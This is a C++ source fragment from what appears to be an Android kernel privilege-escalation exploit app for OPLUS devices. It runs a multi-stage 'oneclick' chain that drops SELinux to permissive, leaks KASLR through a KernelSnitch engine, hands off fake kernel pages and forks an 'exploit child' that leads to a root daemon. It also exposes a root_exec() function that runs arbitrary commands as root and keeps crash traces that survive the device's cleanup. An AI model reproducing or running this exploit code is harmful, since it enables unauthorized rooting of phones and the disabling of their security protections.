    prctl(PR_SET_NAME, phase, 0, 0, 0);
    unsetenv("GL_STAGE1A_ONLY");
    unsetenv("GL_REPAIR_ONLY");
    if (!strcmp(phase, "gl_stage1a")) setenv("GL_STAGE1A_ONLY", "1", 1);
    if (!strcmp(phase, "gl_stage1b")) setenv("GL_REPAIR_ONLY", "1", 1);
    int rc = glshell_entry();
    _exit(rc);
}

/* KernelSnitch creates thousands of pthreads.  Calling pthread_create after
 * fork()ing Android's multithreaded ART process is undefined and deadlocked
 * in bionic on this device.  Execute the APK-packaged standalone glshell for
 * the heavy engine stage so it starts with pristine libc/pthread state. */
static pid_t oneclick_spawn_clean_engine() {
    pid_t pid = fork();
    if (pid != 0) return pid;
    prctl(PR_SET_PDEATHSIG, SIGKILL, 0, 0, 0);
    prctl(PR_SET_NAME, "gl_engine", 0, 0, 0);
    unsetenv("GL_STAGE1A_ONLY");
    unsetenv("GL_REPAIR_ONLY");
    execl(g_engine_path, "glshell", static_cast<char *>(nullptr));
    status("ABORT oneclick: exec %s failed errno=%d", g_engine_path, errno);
    _exit(127);
}

static bool oneclick_wait_file(const char *path, const char *needle,
                               pid_t child, int timeout_ms) {
    for (int elapsed = 0; elapsed < timeout_ms; elapsed += 100) {
        if (oneclick_file_contains(path, needle)) return true;
        int child_status = 0;
        pid_t done = waitpid(child, &child_status, WNOHANG);
        if (done == child) return false;
        usleep(100000);
    }
    return false;
}

static void oneclick_controller(const char *status_path,
                                const char *values_path) {
    status("=== ONECLICK controller pid=%d uid=%d ===",
           static_cast<int>(getpid()), static_cast<int>(getuid()));

    if (oneclick_enforcing()) {
        status("ONECLICK 1/4: stage1a SELinux transition");
        pid_t a = oneclick_spawn_engine("gl_stage1a");
        if (a <= 0) {
            status("ABORT oneclick: cannot fork stage1a errno=%d", errno);
            park();
        }
        bool permissive = false;
        for (int i = 0; i < 200; ++i) {
            if (!oneclick_enforcing()) { permissive = true; break; }
            int child_status = 0;
            if (waitpid(a, &child_status, WNOHANG) == a) break;
            usleep(100000);
        }
        if (!permissive) {
            status("ABORT oneclick: stage1a did not reach permissive");
            park();
        }

        status("ONECLICK 2/4: stage1b repair");
        pid_t b = oneclick_spawn_engine("gl_stage1b");
        if (b <= 0 ||
            !oneclick_wait_file(status_path, "STAGE1B_OK", b, 20000)) {
            status("ABORT oneclick: stage1b repair failed");
            park();
        }
    } else {
        status("ONECLICK 1-2/4: already permissive; reusing repaired state");
    }

    status("ONECLICK 3/4: KASLR leak and fake-page handoff");
    unlink(values_path);
    pid_t engine = oneclick_spawn_clean_engine();
    if (engine <= 0 ||
        !oneclick_wait_file(values_path, "READY", engine, 600000)) {
        status("ABORT oneclick: engine handoff failed");
        park();
    }

    status("ONECLICK 4/4: app-context fire and root handoff");
    unsetenv("GL_STAGE1A_ONLY");
    unsetenv("GL_REPAIR_ONLY");
    child_main();
    park();
}
#endif

bool root_daemon_alive(std::string *banner) {
    char buf[256] = {0};
    int n = daemon_query('S', buf, sizeof(buf), 1500);
    if (n <= 0) return false;
    if (banner) *banner = buf;
    return true;
}

std::string root_exec(const char *cmd) {
    // daemon_query uses the buffer for both request and response.
    size_t cap = strlen(cmd) + 65536;
    std::vector<char> buf(cap);
    snprintf(buf.data(), cap, "%s", cmd);
    int n = daemon_query('C', buf.data(), cap, 15000);
    if (n < 0) return "";
    return std::string(buf.data());
}

std::string root_stage_status(const char *status_path) {
    int fd = open(status_path, O_RDONLY | O_CLOEXEC);
    if (fd < 0) return "(no status file yet)";
    struct stat st{};
    fstat(fd, &st);
    std::string s;
    s.resize((size_t) st.st_size);
    size_t off = 0;
    while (off < s.size()) {
        ssize_t n = read(fd, &s[off], s.size() - off);
        if (n <= 0) break;
        off += (size_t) n;
    }
    close(fd);
    s.resize(off);
    return s.empty() ? std::string("(status file empty)") : s;
}

std::string root_stage_start(const char *status_path, const char *libdir) {
    if (libdir && libdir[0]) {
        snprintf(g_engine_path, sizeof(g_engine_path), "%s/libglshell_exec.so",
                 libdir);
    }
    std::string banner;
    if (root_daemon_alive(&banner)) {
        return std::string("daemon already running: ") + banner;
    }

    sibling_path(status_path, "gl_child.pid", g_lock_path, sizeof(g_lock_path));
#ifdef OPLUS_ONECLICK
    char values_path[512];
    sibling_path(status_path, "gl_page_values.txt", values_path,
                 sizeof(values_path));
    setenv("GL_STATUS_PATH", status_path, 1);
    setenv("GL_VALUES_PATH", values_path, 1);
#endif
    /* One child at a time. A second one would park a second set of poisoned
     * threads and, worse, race the first for the zero-lock slots. */
    if (child_alive()) {
        return "exploit child already running; not forking a second one";
    }

    int fd = open(status_path, O_WRONLY | O_CREAT | O_APPEND | O_CLOEXEC, 0666);
    if (fd < 0) return std::string("cannot open status file: ") + strerror(errno);
    g_status_fd = fcntl(fd, F_DUPFD, 2000);
    close(fd);
    if (g_status_fd < 0) return std::string("cannot dup status fd: ") + strerror(errno);
    /* O_SYNC: a panic loses the page cache, and the fire trace is exactly the
     * data that must survive one. */
    std::string trace_path = status_path;
    trace_path = trace_path.substr(0, trace_path.rfind('/')) + "/gl_trace.txt";
    int tfd = open(trace_path.c_str(), O_WRONLY | O_CREAT | O_APPEND | O_SYNC | O_CLOEXEC, 0666);
    if (tfd >= 0) {
        g_trace_fd = fcntl(tfd, F_DUPFD, 2000);
        close(tfd);
    }
    /* Second copy in /data/local/tmp: OPLUS wipes the whole package from
     * /data after a crash reboot, and the fire trace is exactly the evidence
     * that must outlive it. The file is pre-created by adb; if policy denies
     * the app writing there, this open simply fails and the filesDir copy
     * still exists. */
    int tfd2 = open("/data/local/tmp/gl_trace.txt",
                    O_WRONLY | O_APPEND | O_SYNC | O_CLOEXEC);
    if (tfd2 >= 0) {
        g_trace_fd2 = fcntl(tfd2, F_DUPFD, 2000);
        close(tfd2);
    }

    status("=== launcher: forking exploit child ===");

    pid_t p = fork();
    if (p < 0) return std::string("fork failed: ") + strerror(errno);
    if (p == 0) {
        setsid();
#ifdef OPLUS_ONECLICK
        oneclick_controller(status_path, getenv("GL_VALUES_PATH"));
#else
        child_main();     // never returns
#endif
        park();
        _exit(0);
    }

    int lfd = open(g_lock_path, O_WRONLY | O_CREAT | O_TRUNC | O_CLOEXEC, 0600);
    if (lfd >= 0) {
        char pidbuf[32];
        int n = snprintf(pidbuf, sizeof(pidbuf), "%d\n", (int) p);
        if (n > 0) (void)! write(lfd, pidbuf, (size_t) n);
        close(lfd);
    }

    char buf[128];
    snprintf(buf, sizeof(buf), "exploit child started pid=%d", (int) p);
    return buf;
}

/* file-scope export: post_root lives in the anonymous namespace above */
void gl_post_root(void *a) { post_root(a); }

int gl_probe_setcon(void) { return probe_setcon(); }
